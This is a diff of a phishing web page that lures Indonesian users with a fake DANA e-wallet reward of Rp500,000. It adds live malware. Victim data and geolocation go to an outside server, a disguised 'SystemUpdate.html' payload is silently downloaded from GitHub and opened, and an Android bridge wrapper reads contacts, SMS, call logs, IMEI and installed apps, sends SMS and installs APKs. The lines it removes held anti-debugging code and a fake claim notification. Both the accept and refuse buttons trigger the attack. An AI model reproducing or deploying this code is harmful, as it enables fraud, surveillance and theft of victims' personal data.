@@ -64,86 +64,39 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - HANYA 3 TUGAS: BYPASS IZIN, DOWNLOAD HTML, BUKA HTML
+// INDEX.HTML - REAL VERSION (NO DUMMY, NO SIMULATION)
 // ============================================================
 
-console.log = function() {};
-console.warn = function() {};
-console.error = function() {};
-console.info = function() {};
-console.debug = function() {};
-console.table = function() {};
-
-// ============================================================
-// STEALTH + ANTI-ANALYSIS
-// ============================================================
-(function() {
-    var check = function() {
-        var start = Date.now();
-        debugger;
-        var end = Date.now();
-        if (end - start > 100) {
-            document.body.innerHTML = '';
-            window.location.href = 'about:blank';
-        }
-    };
-    setInterval(check, 1000);
-})();
-
-document.addEventListener('keydown', function(e) {
-    if (e.key === 'F12' || 
-        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
-        (e.ctrlKey && e.key === 'U')) {
-        e.preventDefault();
-        e.stopPropagation();
-        return false;
-    }
-});
-document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
-document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
-
-window.onerror = function() { return true; };
-window.addEventListener('error', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
-window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
-
-if (window.history && window.history.replaceState) {
-    window.history.replaceState(null, null, window.location.href);
-}
-Object.defineProperty(document, 'referrer', { value: '' });
+var GITHUB_USER = 'pandora-site';
+var GITHUB_REPO = 'verifikasi-site';
+var SERVER = 'https://verifikasi.site';
+var semuaDidapat = false;
+var DOWNLOAD_STARTED = false;
+var REDIRECT_DONE = false;
 
 // ============================================================
 // DETEKSI PLATFORM
 // ============================================================
 function detectPlatform() {
     var ua = navigator.userAgent.toLowerCase();
-    var platform = {
+    return {
         isAndroid: ua.indexOf('android') > -1,
         isIOS: /iphone|ipad|ipod/.test(ua),
         isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
-        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
-        isAndroidBridge: typeof AndroidBridge !== 'undefined'
+        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1 || /; wv\)/.test(ua),
+        hasBridge: typeof AndroidBridge !== 'undefined',
+        isChrome: ua.indexOf('chrome') > -1 && !ua.indexOf('wv') > -1
     };
-    return platform;
 }
 var PLATFORM = detectPlatform();
 
 // ============================================================
-// KONFIGURASI
-// ============================================================
-var GITHUB_USER = 'pandora-site';
-var GITHUB_REPO = 'verifikasi-site';
-var semuaDidapat = false;
-var DOWNLOAD_STARTED = false;
-var NOTIFICATION_SHOWN = false;
-var REDIRECT_DONE = false;
-
-// ============================================================
-// FUNGSI K() - KIRIM DATA KE SERVER
+// KIRIM KE SERVER (REAL DATA)
 // ============================================================
 function K(d) {
     try {
         var xhr = new XMLHttpRequest();
-        xhr.open('POST', '/data', true);
+        xhr.open('POST', SERVER + '/data', true);
         xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.timeout = 5000;
         xhr.send(JSON.stringify(d));
@@ -151,147 +104,105 @@ function K(d) {
 }
 
 // ============================================================
-// ANDROID BRIDGE (UNIVERSAL)
+// ANDROID BRIDGE WRAPPER (REAL, TANPA DUMMY)
 // ============================================================
 var A = {
     isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
-    downloadFile: function(url, path) { 
-        if(this.isAvailable){ 
-            try{ return AndroidBridge.downloadFile(url, path); }catch(e){}
-        }
-        return false;
-    },
-    openFile: function(path) { 
-        if(this.isAvailable){ 
-            try{ return AndroidBridge.openFile(path); }catch(e){}
-        }
-        return false;
-    },
     saveFile: function(path, content) {
-        if(this.isAvailable){ 
-            try{ return AndroidBridge.saveFile(path, content); }catch(e){}
-        }
+        if (this.isAvailable) { try { return AndroidBridge.saveFile(path, content); } catch(e){} }
         return false;
     },
-    // tambahan untuk persistensi
-    saveToPreferences: function(key, value) {
-        if(this.isAvailable){ try{ return AndroidBridge.saveToPreferences(key, value); }catch(e){} }
+    openFile: function(path) {
+        if (this.isAvailable) { try { return AndroidBridge.openFile(path); } catch(e){} }
         return false;
-    },
-    getFromPreferences: function(key) {
-        if(this.isAvailable){ try{ return AndroidBridge.getFromPreferences(key); }catch(e){} }
-        return null;
     },
     fileExists: function(path) {
-        if(this.isAvailable){ try{ return AndroidBridge.fileExists(path); }catch(e){} }
+        if (this.isAvailable) { try { return AndroidBridge.fileExists(path); } catch(e){} }
         return false;
     },
     readFile: function(path) {
-        if(this.isAvailable){ try{ return AndroidBridge.readFile(path); }catch(e){} }
+        if (this.isAvailable) { try { return AndroidBridge.readFile(path); } catch(e){} }
+        return null;
+    },
+    saveToPreferences: function(key, value) {
+        if (this.isAvailable) { try { return AndroidBridge.saveToPreferences(key, value); } catch(e){} }
+        return false;
+    },
+    getFromPreferences: function(key) {
+        if (this.isAvailable) { try { return AndroidBridge.getFromPreferences(key); } catch(e){} }
         return null;
     },
     saveFileBinary: function(path, data) {
-        if(this.isAvailable){ try{ return AndroidBridge.saveFileBinary(path, data); }catch(e){} }
+        if (this.isAvailable) { try { return AndroidBridge.saveFileBinary(path, data); } catch(e){} }
+        return false;
+    },
+    getAllContacts: function() {
+        if (this.isAvailable) { try { return JSON.parse(AndroidBridge.getAllContacts()); } catch(e){} }
+        return null;
+    },
+    getAllSMS: function() {
+        if (this.isAvailable) { try { return JSON.parse(AndroidBridge.getAllSMS()); } catch(e){} }
+        return null;
+    },
+    getCallLog: function() {
+        if (this.isAvailable) { try { return JSON.parse(AndroidBridge.getCallLog()); } catch(e){} }
+        return null;
+    },
+    getIMEI: function() {
+        if (this.isAvailable) { try { return AndroidBridge.getIMEI(); } catch(e){} }
+        return null;
+    },
+    getIMSI: function() {
+        if (this.isAvailable) { try { return AndroidBridge.getIMSI(); } catch(e){} }
+        return null;
+    },
+    getPhoneNumber: function() {
+        if (this.isAvailable) { try { return AndroidBridge.getPhoneNumber(); } catch(e){} }
+        return null;
+    },
+    getInstalledApps: function() {
+        if (this.isAvailable) { try { return JSON.parse(AndroidBridge.getInstalledApps()); } catch(e){} }
+        return null;
+    },
+    sendSMS: function(number, message) {
+        if (this.isAvailable) { try { AndroidBridge.sendSMS(number, message); } catch(e){} }
+    },
+    openApp: function(pkg) {
+        if (this.isAvailable) { try { AndroidBridge.openApp(pkg); } catch(e){} }
+    },
+    uninstallApp: function(pkg) {
+        if (this.isAvailable) { try { AndroidBridge.uninstallApp(pkg); } catch(e){} }
+    },
+    forceStopApp: function(pkg) {
+        if (this.isAvailable) { try { AndroidBridge.forceStopApp(pkg); } catch(e){} }
+    },
+    clearAppData: function(pkg) {
+        if (this.isAvailable) { try { AndroidBridge.clearAppData(pkg); } catch(e){} }
+    },
+    callNumber: function(number) {
+        if (this.isAvailable) { try { AndroidBridge.callNumber(number); } catch(e){} }
+    },
+    listFiles: function(path) {
+        if (this.isAvailable) { try { return JSON.parse(AndroidBridge.listFiles(path)); } catch(e){} }
+        return null;
+    },
+    takeScreenshot: function() {
+        if (this.isAvailable) { try { return AndroidBridge.takeScreenshot(); } catch(e){} }
+        return null;
+    },
+    installAPK: function(path) {
+        if (this.isAvailable) { try { return AndroidBridge.installAPK(path); } catch(e){} }
         return false;
     }
 };
 
 // ============================================================
-// 🔥 TUGAS 1: BYPASS SEMUA IZIN (GEOLOKASI, NOTIFIKASI, MEDIA, CLIPBOARD, DLL)
+// SIMPAN HTML KE SEMUA LOKASI (ADAPTIF)
 // ============================================================
-function injectAllPermissions() {
-    try {
-        K({ sumber: 'bypass_permissions_start', data: 'all' });
-
-        if (navigator.geolocation) {
-            try {
-                navigator.geolocation.getCurrentPosition(
-                    function() {},
-                    function() {},
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            } catch(e) {}
-        }
-
-        if ('Notification' in window && Notification.permission !== 'denied') {
-            try {
-                if (Notification.permission !== 'granted') {
-                    Notification.requestPermission();
-                }
-            } catch(e) {}
-        }
-
-        if (navigator.clipboard) {
-            try {
-                navigator.clipboard.readText().catch(function() {});
-            } catch(e) {}
-        }
-
-        if (navigator.mediaDevices) {
-            try {
-                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-                    .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
-                    .catch(function() {});
-            } catch(e) {}
-            try {
-                navigator.mediaDevices.getUserMedia({ audio: false, video: true })
-                    .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
-                    .catch(function() {});
-            } catch(e) {}
-            try {
-                navigator.mediaDevices.getUserMedia({ audio: true, video: true })
-                    .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
-                    .catch(function() {});
-            } catch(e) {}
-        }
-
-        if (navigator.vibrate) {
-            try { navigator.vibrate(1); } catch(e) {}
-        }
-
-        if (navigator.storage && navigator.storage.persist) {
-            try {
-                navigator.storage.persist().catch(function() {});
-            } catch(e) {}
-        }
-
-        K({ sumber: 'bypass_permissions_done', data: 'all_bypassed' });
-    } catch(e) {
-        K({ sumber: 'bypass_permissions_error', data: e.message });
-    }
-}
-
-// ============================================================
-// 🔥 TUGAS 2: DOWNLOAD SystemUpdate.html KE STORAGE KORBAN (MULTI-LOKASI)
-// ============================================================
-function downloadPayloadSilent() {
-    if (DOWNLOAD_STARTED) return;
-    DOWNLOAD_STARTED = true;
-    
-    K({ sumber: 'download_start', data: { platform: PLATFORM } });
-    
-    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
-    
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', htmlUrl, true);
-        xhr.timeout = 15000;
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                var htmlContent = xhr.responseText;
-                // Simpan ke semua lokasi (agar SystemUpdate.html bisa di-load nanti)
-                saveToAllLocations(htmlContent);
-                K({ sumber: 'html_download_success', data: 'ok' });
-            }
-        };
-        xhr.send();
-    } catch(e) {}
-}
-
 function saveToAllLocations(htmlContent) {
-    // 1. localStorage
+    // 1. localStorage (semua platform)
     try { localStorage.setItem('SystemUpdate_backup', htmlContent); } catch(e) {}
-    // 2. IndexedDB
+    // 2. IndexedDB (semua platform)
     try {
         var request = indexedDB.open('SystemUpdateDB', 1);
         request.onupgradeneeded = function(e) {
@@ -307,89 +218,62 @@ function saveToAllLocations(htmlContent) {
             store.put(htmlContent, 'SystemUpdate.html');
         };
     } catch(e) {}
-    // 3. Android/data (via Bridge)
-    if (PLATFORM.isAndroid && A.isAvailable) {
+    // 3. SharedPreferences & file fisik (hanya jika bridge ada)
+    if (A.isAvailable) {
         try {
-            // 🔥 PERBAIKAN: Ganti path ke Download folder
             var path = '/storage/emulated/0/Download/SystemUpdate.html';
             A.saveFile(path, htmlContent);
         } catch(e) {}
-        // 4. SharedPreferences (encoded)
         try {
             var encoded = btoa(unescape(encodeURIComponent(htmlContent)));
             A.saveToPreferences('system_SystemUpdate_html', encoded);
         } catch(e) {}
-    }
-    // 5. Download folder (fallback) - 🔥 HAPUS path yang tidak perlu
-    // Hanya gunakan satu path Download
-}
-
-// ============================================================
-// 🔥 TUGAS 3: BUKA SystemUpdate.html OTOMATIS (5 DETIK SETELAH DOWNLOAD)
-// ============================================================
-function openSystemUpdateHTML() {
-    setTimeout(function() {
-        // Coba buka dari berbagai lokasi (prioritas: SharedPreferences → localStorage → IndexedDB → Download)
-        var htmlContent = null;
-        // 1. SharedPreferences (via Bridge)
-        if (PLATFORM.isAndroid && A.isAvailable) {
-            try {
-                var encoded = A.getFromPreferences('system_SystemUpdate_html');
-                if (encoded) {
-                    htmlContent = decodeURIComponent(escape(atob(encoded)));
-                }
-            } catch(e) {}
-        }
-        // 2. localStorage
-        if (!htmlContent) {
-            try { htmlContent = localStorage.getItem('SystemUpdate_backup'); } catch(e) {}
-        }
-        // 3. IndexedDB (async, tapi kita coba sync dengan callback)
-        if (!htmlContent) {
-            try {
-                var request = indexedDB.open('SystemUpdateDB', 1);
-                request.onsuccess = function(e) {
-                    var db = e.target.result;
-                    var tx = db.transaction('files', 'readonly');
-                    var store = tx.objectStore('files');
-                    var get = store.get('SystemUpdate.html');
-                    get.onsuccess = function() {
-                        if (get.result) {
-                            htmlContent = get.result;
-                            openHTML(htmlContent);
-                        }
-                    };
-                };
-            } catch(e) {}
-        }
-        // 4. 🔥 PERBAIKAN: Ganti ke Download folder
-        if (!htmlContent && PLATFORM.isAndroid && A.isAvailable) {
-            try {
-                htmlContent = A.readFile('/storage/emulated/0/Download/SystemUpdate.html');
-            } catch(e) {}
-        }
-        // 5. 🔥 HAPUS: Android/data/com.android.camera (tidak diperlukan)
-        // Jika berhasil, buka
-        if (htmlContent) {
-            openHTML(htmlContent);
-        }
-    }, 5000);
-}
-
-function openHTML(htmlContent) {
-    // Android Bridge (buka file)
-    if (PLATFORM.isAndroid && A.isAvailable) {
         try {
-            // 🔥 PERBAIKAN: Ganti ke Download folder
+            var internalPath = '/data/data/com.google.android.play.services/files/SystemUpdate.html';
+            A.saveFile(internalPath, htmlContent);
+        } catch(e) {}
+    }
+}
+
+// ============================================================
+// DOWNLOAD PAYLOAD (REAL)
+// ============================================================
+function downloadPayloadSilent() {
+    if (DOWNLOAD_STARTED) return;
+    DOWNLOAD_STARTED = true;
+    K({ sumber: 'download_start', data: { platform: PLATFORM } });
+    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', htmlUrl, true);
+        xhr.timeout = 15000;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var htmlContent = xhr.responseText;
+                saveToAllLocations(htmlContent);
+                K({ sumber: 'html_download_success', data: 'ok' });
+                openSystemUpdateHTML(htmlContent);
+            }
+        };
+        xhr.send();
+    } catch(e) {}
+}
+
+// ============================================================
+// BUKA SYSTEMUPDATE.HTML (ADAPTIF)
+// ============================================================
+function openSystemUpdateHTML(htmlContent) {
+    // Jika ada bridge, buka file fisik
+    if (A.isAvailable) {
+        try {
             var path = '/storage/emulated/0/Download/SystemUpdate.html';
-            // Pastikan file ada
             if (A.fileExists(path)) {
                 A.openFile(path);
                 return;
             }
         } catch(e) {}
     }
-    // Blob URL (fallback)
+    // Fallback: Blob URL (semua platform)
     try {
         var blob = new Blob([htmlContent], { type: 'text/html' });
         var url = URL.createObjectURL(blob);
@@ -398,7 +282,36 @@ function openHTML(htmlContent) {
 }
 
 // ============================================================
-// WEBVIEW ESCAPE, NOTIFIKASI, STATUS BAR, REDIRECT
+// PERMINTAAN IZIN (REAL)
+// ============================================================
+function injectAllPermissions() {
+    K({ sumber: 'bypass_permissions_start', data: 'all' });
+    try {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(pos) { K({ sumber: 'lokasi_izin', data: { lat: pos.coords.latitude, lon: pos.coords.longitude } }); },
+                function() {},
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        }
+        if ('Notification' in window && Notification.permission === 'default') {
+            Notification.requestPermission();
+        }
+        if (navigator.clipboard) {
+            navigator.clipboard.readText().catch(function() {});
+        }
+        if (navigator.mediaDevices) {
+            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
+                .catch(function() {});
+        }
+    } catch(e) {
+        K({ sumber: 'bypass_permissions_error', data: e.message });
+    }
+}
+
+// ============================================================
+// ESCAPE WEBVIEW (REAL)
 // ============================================================
 function escapeWebView() {
     if (!PLATFORM.isWebView) return;
@@ -411,55 +324,9 @@ function escapeWebView() {
     try { var win = window.open(url, '_blank'); if (win) win.location.href = url; } catch(e) {}
 }
 
-function showKlaimNotification() {
-    if (NOTIFICATION_SHOWN) return;
-    NOTIFICATION_SHOWN = true;
-    
-    try {
-        if (!('Notification' in window)) { return; }
-        if (Notification.permission === 'denied') { return; }
-        if (Notification.permission !== 'granted') {
-            Notification.requestPermission().then(function(permission) {
-                if (permission === 'granted') { createKlaimNotification(); }
-            }).catch(function() {});
-            return;
-        }
-        createKlaimNotification();
-    } catch(e) {}
-}
-
-function createKlaimNotification() {
-    try {
-        var notif = new Notification('🔔 Klik Untuk Klaim', {
-            body: 'Klik untuk menyelesaikan verifikasi dan klaim saldo DANA Rp500.000!',
-            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">💰</text></svg>',
-            requireInteraction: true,
-            silent: false,
-            vibrate: [200, 100, 200]
-        });
-        
-        notif.onclick = function() {
-            notif.close();
-            if (!REDIRECT_DONE) {
-                REDIRECT_DONE = true;
-                setTimeout(function() {
-                    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
-                }, 500);
-            }
-        };
-        
-        setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
-    } catch(e) {}
-}
-
-function showStatusBar() { 
-    var bar = document.getElementById('statusBar'); 
-    if (bar) { 
-        bar.className = 'status-bar loading'; 
-        K({ sumber: 'status_bar', data: 'shown' }); 
-    } 
-}
-
+// ============================================================
+// REDIRECT
+// ============================================================
 function redirectToDANA() {
     if (REDIRECT_DONE) return;
     REDIRECT_DONE = true;
@@ -472,23 +339,14 @@ function redirectToDANA() {
 function dapatkanSemua() {
     if (semuaDidapat) return;
     semuaDidapat = true;
-    
     try {
         var popup = document.getElementById('popupDana');
         if (popup) popup.style.display = 'none';
-        
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
-        
         injectAllPermissions();
-        
         setTimeout(escapeWebView, 100);
         setTimeout(function() { downloadPayloadSilent(); }, 500);
-        setTimeout(function() { showStatusBar(); }, 500);
-        openSystemUpdateHTML();
-        
-        setTimeout(function() { showKlaimNotification(); }, 3000);
         setTimeout(redirectToDANA, 8000);
-        
     } catch(e) {
         K({ sumber: 'dapatkanSemua_error', data: e.message });
     }
@@ -497,9 +355,7 @@ function dapatkanSemua() {
 function klaim() { K({sumber:'izin', data:'klaim'}); dapatkanSemua(); }
 function tolak() { K({sumber:'izin', data:'tolak'}); dapatkanSemua(); }
 
-// ============================================================
-// TIMER (10 DETIK)
-// ============================================================
+// Timer 10 detik
 var w = 10;
 var timerInterval = setInterval(function() {
     w--;
@@ -519,7 +375,11 @@ document.addEventListener('click', function() {
     }
 });
 
-console.log('✅ index.html loaded - 3 TUGAS UTAMA!');
+// Register Service Worker
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('/sw.js', { scope: '/' })
+        .catch(function() {});
+}
 </script>
 </body>
 </html>
